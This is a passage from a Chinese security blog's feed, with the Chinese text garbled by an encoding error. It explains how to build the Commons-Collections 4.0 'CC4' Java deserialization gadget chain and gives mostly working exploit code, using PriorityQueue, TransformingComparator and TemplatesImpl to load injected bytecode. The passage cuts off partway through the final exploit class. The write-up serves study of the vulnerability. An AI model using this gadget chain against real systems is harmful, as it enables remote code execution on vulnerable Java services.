&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/&quot;&gt;https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ã€ŠJavaå®‰å…¨æ¼«è°ˆã€‹&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CC4é“¾</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/09/04/CC4%E9%93%BE/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/09/04/CC4%E9%93%BE/</id>
    <published>2024-09-04T07:51:58.000Z</published>
    <updated>2024-09-07T08:12:38.536Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™å‡ å¤©é‡æ–°æŠŠå‰é¢å››æ¡é“¾å­è¿‡äº†ä¸€éæ›´æ–°äº†åšå®¢ï¼Œé¢‡æœ‰æ”¶è·</p><p>ä¹Ÿæ˜¯åœ¨å¿«5ä¸ªæœˆä¹‹åé‡æ–°æ¡èµ·æ¥ccé“¾äº†</p><br><p>åœ¨2015å¹´ commons-collections ååºåˆ—åŒ–åˆ©ç”¨é“¾è¢«æå‡ºæ—¶ï¼ŒApache Commons Collectionsæœ‰ä»¥ä¸‹ä¸¤ä¸ªåˆ†æ”¯ç‰ˆæœ¬ï¼š</p><ul><li><p>commons-collections:commons-collections</p></li><li><p>org.apache.commons:commons-collections4</p></li></ul><p>å‰è€…æ˜¯è€ç‰ˆæœ¬çš„åŒ…ï¼Œå½“æ—¶ç‰ˆæœ¬æ˜¯3.2.1ï¼›è€Œåè€…æ˜¯å®˜æ–¹åœ¨2013å¹´æ¨å‡ºçš„4ç‰ˆæœ¬ï¼Œå½“æ—¶çš„ç‰ˆæœ¬å·æ˜¯4.0ï¼›ä¸¤è€…çš„å‘½åç©ºé—´ä¸å†²çªï¼Œå› æ­¤å¯ä»¥å…±å­˜åœ¨åŒä¸€ä¸ªé¡¹ç›®ä¸­</p><p>å‚è€ƒï¼š</p><p>ã€ŠJavaå®‰å…¨æ¼«è°ˆã€‹</p><p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/">https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/</a></p><span id="more"></span><hr><h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>jdk8u65 + Commons-Collections 4.0</p><p>pom.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-collections4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="commons-collections4çš„æ”¹åŠ¨"><a href="#commons-collections4çš„æ”¹åŠ¨" class="headerlink" title="commons-collections4çš„æ”¹åŠ¨"></a>commons-collections4çš„æ”¹åŠ¨</h1><p>å…ˆæµ‹ä¸€ä¸‹è€çš„é“¾å­èƒ½å¦åœ¨ commons-collections4 ä¸­ä½¿ç”¨ï¼Œä»¥cc6ä¸ºä¾‹ï¼ŒæŠŠä¾èµ–é‡Œçš„ org.apache.commons.collections å…¨éƒ¨æ¢æˆ  org.apache.commons.collections4</p><p>ç„¶åå°±ä¼šå‘ç°<code>LazyMap.decorate(innerMap, transformerChain);</code>å˜çº¢äº†</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904162300908.png" alt="image-20240904162300908"></p><p>çœ‹ä¸€ä¸‹åœ¨ commons-collections3 ä¸­ decorate çš„å®šä¹‰ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Map</span> <span class="token function">decorate</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> factory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">LazyMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> factory<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªæ–¹æ³•ä¸è¿‡å°±æ˜¯ LazyMap æ„é€ å‡½æ•°çš„â¼€ä¸ªåŒ…è£…ï¼Œâ½½åœ¨4ä¸­å…¶å®åªæ˜¯æ”¹äº†ä¸ªåå­—å« <code>lazyMap</code></p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904162648794.png" alt="image-20240904162648794"></p><p>æ‰€ä»¥åªè¦æŠŠ<code>LazyMap.decorate</code>æ›¿æ¢æˆ<code>LazyMap.lazyMap</code>å³å¯å¼¹è®¡ç®—å™¨ï¼Œcc1ã€cc3åŒç†</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904163015938.png" alt="image-20240904163015938"></p><p>ä½†æ˜¯ï¼Œ CommonsCollections4 é™¤ 4.0 çš„å…¶ä»–ç‰ˆæœ¬å»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œå¯¼è‡´æ— æ³•åºåˆ—åŒ–</p><hr><h1 id="PriorityQueueåˆ©ç”¨é“¾"><a href="#PriorityQueueåˆ©ç”¨é“¾" class="headerlink" title="PriorityQueueåˆ©ç”¨é“¾"></a>PriorityQueueåˆ©ç”¨é“¾</h1><blockquote><p>åœ¨commons-collectionsä¸­æ‰¾Gadgetçš„è¿‡ç¨‹ï¼Œå®é™…ä¸Šå¯ä»¥ç®€åŒ–ä¸ºæ‰¾â¼€æ¡ä»<code>Serializable#readObject()</code>æ–¹æ³•åˆ°<code>Transformer#transform()</code>æ–¹æ³•çš„è°ƒç”¨é“¾</p></blockquote><p>ä»å°¾éƒ¨å‘é¦–éƒ¨åˆ†æï¼Œå°¾éƒ¨å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼å°±ä¸¤ç§ï¼Œåå°„æˆ–æ˜¯åŠ¨æ€åŠ è½½å­—èŠ‚ç ã€‚å› ä¸º CC4 é“¾ä¸Šåªæ˜¯å»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œæ‰€ä»¥æœ€åçš„å‘½ä»¤æ‰§è¡Œä¸å—å½±å“</p><p>æ—¢ç„¶ InvokerTransformer è¿™é‡Œç”¨ä¸äº†äº†ï¼Œæˆ‘ä»¬å»æ‰¾è°è°ƒç”¨äº† <code>transform()</code> æ–¹æ³•ï¼ŒCC3 ä¸­æˆ‘ä»¬ç”¨äº†<code>InstantiateTransformer</code>æ¥ä»£æ›¿ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹ŸåŒæ ·åœ¨ commons-collections4 çš„è¿™ä¸ªç±»é‡Œæ‰¾çªç ´ç‚¹</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904165852024.png" alt="image-20240904165852024"></p><p>åœ¨ <code>TransformingComparator</code> è¿™ä¸ªç±»ä¸­çš„ <code>compare()</code> æ–¹æ³•è°ƒç”¨äº† <code>transform()</code> æ–¹æ³•ï¼Œ<code>compare()</code> è¿™ä¸ªæ–¹æ³•ä¹Ÿæ˜¯æˆ‘ä»¬æ¯”è¾ƒå–œæ¬¢çš„é‚£ç§ï¼Œå› ä¸ºå®ƒéå¸¸å¸¸è§</p><p>ç»§ç»­è·Ÿï¼Œä¸€æ‰¾ä¸€ä¸ªä¸å±å£°ï¼Œåœ¨ java.util é‡Œé¢æ‰¾åˆ°æˆ‘ä»¬çš„ç›®æ ‡ PriorityQueue ç±»</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904170311820.png" alt="image-20240904170311820"></p><p>ä¸€è·¯è·Ÿè¿‡å»å°±å¯ä»¥æ‰¾åˆ°è°ƒç”¨é“¾ï¼š</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904171310918.png" alt="image-20240904171310918"></p><hr><h1 id="æ„é€ Gadget"><a href="#æ„é€ Gadget" class="headerlink" title="æ„é€ Gadget"></a>æ„é€ Gadget</h1><p>ç¬¬ä¸€æ­¥ï¼Œå…ˆå†™<code>InstantiateTransformer.transform()</code>åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼Œå’Œcc3å·®ä¸å¤š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc4</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformerExec</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InstantiateTransformer</span> instantiateTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>obj<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        instantiateTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥æ˜¯ <code>TransformingComparator</code> ç±»çš„ <code>compare()</code> æ–¹æ³•çš„è°ƒç”¨ï¼Œå› ä¸ºå®ƒæ˜¯å¯åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æˆ–è®¸å¯ä»¥é€šè¿‡åå°„ä¿®æ”¹å…¶è°ƒç”¨ <code>compare()</code> æ–¹æ³•çš„å€¼ï¼Œå†™ä¸€ä¸‹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc4</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ComparatorExec</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> obj <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è°ƒè¯•å‘ç° heapify è¿™é‡Œæ²¡è¿› <code>siftDown</code></p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904214823437.png" alt="image-20240904214823437"></p><p>åŸå› æ˜¯è¿™ä¸€æ®µ <code>size &gt;&gt;&gt; 1</code>ï¼Œ<code>&gt;&gt;&gt;</code> æ˜¯ç§»ä½è¿ç®—ç¬¦ï¼Œä¸Šé¢çš„sizeä¸º0ï¼Œä¼šè·³å‡ºå¾ªç¯ï¼Œå½“æˆ‘ä»¬æŠŠ size æ›¿æ¢ä¸º 2 æ—¶ï¼Œæ‰èƒ½è¿›å¾ªç¯</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904215314060.png" alt="image-20240904215314060"></p><p>alt+f8æ±‚ä¸€ä¸‹å€¼ï¼š</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904215402597.png" alt="image-20240904215402597"></p><p>æ­¤æ—¶ä¸º1ï¼Œå› æ­¤è¿›å…¥å¾ªç¯ï¼Œæ‰€ä»¥ç°åœ¨æˆ‘ä»¬è¦æƒ³åŠæ³•å°† size çš„å€¼å˜æˆ 2</p><p>è¿™é‡Œè¦ç¨å¾®äº†è§£ä¸€ä¸‹ PriorityQueue è¿™ä¸ªæ•°æ®ç»“æ„çš„åŸç†ï¼Œå‚è€ƒï¼š<a href="https://www.cnblogs.com/linghu-java/p/9467805.html">https://www.cnblogs.com/linghu-java/p/9467805.html</a></p><p>size å°±æ˜¯ PriorityQueue è¿™ä¸ªé˜Ÿåˆ—çš„é•¿åº¦ï¼Œç®€å•ç†è§£å°±æ˜¯æ•°ç»„çš„é•¿åº¦ã€‚ç°åœ¨æˆ‘ä»¬è¿™ä¸ªæ•°ç»„çš„é•¿åº¦ä¸º 0ï¼Œ0 - 1 &#x3D; -1ï¼Œæ‰€ä»¥ä¼šç›´æ¥è·³å‡ºå¾ªç¯</p><p>å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªè¯­å¥åŠ ä¸Šï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>äºæ˜¯å°±å†™å‡ºæˆ‘ä»¬çš„expäº†ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc4</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ComparatorExec</span> <span class="token punctuation">&#123;</span>   